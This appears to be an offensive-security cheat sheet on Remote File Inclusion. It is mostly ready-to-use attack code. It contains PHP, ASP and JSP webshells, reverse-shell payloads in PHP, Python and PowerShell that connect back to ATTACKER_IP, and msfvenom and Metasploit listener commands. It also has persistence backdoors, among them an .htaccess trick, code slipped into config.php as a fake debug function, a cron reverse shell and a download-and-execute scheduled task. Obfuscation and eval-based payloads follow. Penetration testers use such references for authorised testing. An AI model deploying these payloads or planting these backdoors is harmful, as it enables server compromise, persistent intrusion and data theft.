# Remote File Inclusion (RFI)

Remote File Inclusion vulnerabilities allow attackers to include and execute files from remote systems over HTTP/SMB. RFI can lead to immediate remote code execution, credential theft, and full system compromise.

---

## PHP RFI Requirements

```php
// Required php.ini settings
allow_url_include = On
allow_url_fopen = On

// Vulnerable code patterns
include($_GET['page']);
require($_REQUEST['file']);
include_once($user_input);
```

---

## Technology-Specific RFI

### ASP.NET

```csharp
// Server.Execute vulnerability
Server.Execute(Request.QueryString["page"]);

// Response.WriteFile vulnerability
Response.WriteFile(Request.Form["file"]);
```

### JSP

```jsp
<!-- JSP include vulnerability -->
<jsp:include page="<%= request.getParameter("file") %>" />

// RequestDispatcher vulnerability
request.getRequestDispatcher(userInput).include(request, response);
```

### Node.js

```javascript
// Express.js vulnerability
app.get('/page', (req, res) => {
    res.render(req.query.template);
});

// File system vulnerability
fs.readFile(req.query.file, callback);
```

---

## Webshell Arsenal

### PHP Webshells

```php
// Ultra-minimal shell
<?=`$_GET[0]`?>

// Simple backdoor
<?php system($_REQUEST['cmd']); ?>

// Obfuscated shell
<?php $f='system'; $f($_POST['x']); ?>

// Multi-function shell
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
if(isset($_FILES['f'])){
    move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
}
?>
```

### ASP Webshell

```asp
<%
If Request("cmd") <> "" Then
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Response.Write("<pre>" & oScript.Exec("cmd /c " & Request("cmd")).StdOut.ReadAll & "</pre>")
End If
%>
```

### JSP Webshell

```jsp
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    java.io.InputStream is = p.getInputStream();
    java.util.Scanner s = new java.util.Scanner(is).useDelimiter("\\A");
    String output = s.hasNext() ? s.next() : "";
    out.println("<pre>" + output + "</pre>");
}
%>
```

---

## Hosting Malicious Files

### Python HTTP Server

```bash
python3 -m http.server 80
```

### SMB File Hosting

```bash
# Impacket SMB server
impacket-smbserver share . -smb2support

# UNC path inclusion
\\ATTACKER_IP\share\shell.php
```

### Ngrok Public Tunnel

```bash
ngrok authtoken YOUR_TOKEN
ngrok http 80
# Use generated URL in RFI payload
```

---

## Bypass Techniques

### URL Encoding

```
# Standard payload
http://ATTACKER_IP/shell.php

# URL encoded
http%3A%2F%2FATTACKER_IP%2Fshell.php

# Double encoded
http%253A%252F%252FATTACKER_IP%252Fshell.php
```

### Protocol Variations

```
# HTTP variations
http://ATTACKER_IP/shell.php
https://ATTACKER_IP/shell.php

# FTP inclusion
ftp://ATTACKER_IP/shell.php

# SMB/UNC paths
\\ATTACKER_IP\share\shell.php
//ATTACKER_IP/share/shell.php

# Data URLs (if supported)
data://text/plain,<?php system($_GET['cmd']);?>
```

---

## Reverse Shell Payloads

### PHP Reverse Shell

```php
<?php
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/bash -i <&3 >&3 2>&3");
?>
```

### Python via PHP

```php
<?php system('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"'); ?>
```

### PowerShell via PHP

```php
<?php system('powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'); ?>
```

---

## C2 Integration

### Metasploit

```bash
# Generate PHP payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > shell.php

# Host payload
python3 -m http.server 80

# Multi/handler listener
msfconsole -q -x "use exploit/multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; exploit"
```

---

## Persistence Mechanisms

### Web Backdoors

```php
// .htaccess backdoor
<?php
file_put_contents('.htaccess', 'AddType application/x-httpd-php .jpg');
file_put_contents('favicon.jpg', '<?php system($_GET[0]); ?>');
?>

// Config file backdoor
<?php
$config = file_get_contents('config.php');
$backdoor = "\n// Debug function\nif(isset(\$_GET['debug'])) system(\$_GET['debug']);\n";
file_put_contents('config.php', $config . $backdoor);
?>
```

### Scheduled Tasks

```php
// Linux cron job
<?php system('echo "* * * * * /bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\'" | crontab -'); ?>

// Windows scheduled task
<?php system('schtasks /create /tn "Update" /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER_IP/a\')" /sc minute /mo 5'); ?>
```

---

## Payload Obfuscation

```php
// Variable function names
<?php $f = 'sys'.'tem'; $f($_GET['c']); ?>

// Character manipulation
<?php $x=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $x($_GET[0]); ?>

// Reflection-based execution
<?php (new ReflectionFunction('system'))->invoke($_GET['cmd']); ?>
```

---

## Memory-Only Execution

```php
// Fileless PHP execution
<?php
$code = base64_decode($_POST['payload']);
eval($code);
?>
```

---

## Tools

| Tool | Use Case |
|------|----------|
| Burp Suite | Intercept and modify RFI payloads |
| Python HTTP Server | Host malicious files for inclusion |
| Netcat | Reverse shell listeners |
| Ngrok | Public tunnel for file hosting |
| Metasploit | Advanced payload generation |
| Impacket | SMB server for UNC path inclusion |
